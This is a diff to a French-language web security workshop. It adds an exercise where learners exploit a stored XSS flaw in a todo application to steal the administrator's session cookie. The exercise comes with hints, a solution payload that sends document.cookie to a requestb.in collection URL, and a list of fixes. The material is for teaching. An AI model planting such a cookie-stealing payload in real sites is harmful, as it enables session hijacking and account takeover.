@@ -285,6 +285,45 @@ lors de la mise à jour du mot de passe.
 En cible vous pouvez récupérer une base de hash ayant fuité par exemple sur https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm :
 1,493,677,782 entrées, 15GB
 
+== Obtenez les informations de session de l'administrateur
+
+Le site est sensible aux attaques XSS. Profitez en pour obtenir les informations de connection de l'administrateur
+
+++++
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce16" aria-expanded="false" aria-controls="collapseExample">
+  Indice 1
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce17" aria-expanded="false" aria-controls="collapseExample">
+  Indice 2
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#reponse9" aria-expanded="false" aria-controls="collapseExample">
+  Solution
+</a>
+++++
+
+[id=astuce16,role=collapse]
+--
+Utilisez le site https://requestb.in/ pour recueillir les informations de l'attaque XSS
+--
+
+[id=astuce16,role=collapse]
+--
+Créez un todo de type publique avec un script d'attaque
+--
+
+
+[id=reponse9,role=collapse]
+--
+utilisez le code suivant dans la description de la todo.
+<script>document.write("<img src=https://requestb.in/1lwyhpu1?s="+encodeURI(document.cookie)+"></img>");</script>
+--
+
+* Correction
+
+- Supprimez les identifiants de connection du cookie actuel
+- Générez un cookie de session sécurisé (html only et secure) avec un token non rejouable
+- Supprimez l'interprétation de la description d'une todo dans la page publique
+
 == XXE ?
 
 == Augmentez vos privilèges
@@ -335,7 +374,6 @@ Ajoutez un contrôle d'accès au fonctions autorisées
  Annotez les classes avec @RolesAllowed(ADMIN) et @RolesAllowed(Role.USER)
  Les annotations peuvent aussi se faire au niveau des méthodes.
 --
-
 
 
 == Accédez et modifiez les todos des autres utilisateurs
@@ -491,16 +529,7 @@ Ajoutez l'IP d'origine, elle pourra permettre les actions suivantes:
 . identifier des scénarios d'attaque (tentaive de connexion sur plusieurs comptes à partir de la même  ip par exemple)
 . bannir une ip
 
-++++
-<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce16" aria-expanded="false" aria-controls="collapseExample">
-  Indice 1
-</a>
-++++
 
-[id=astuce16,role=collapse]
---
-
---
 
 
 == click jacking  et headers
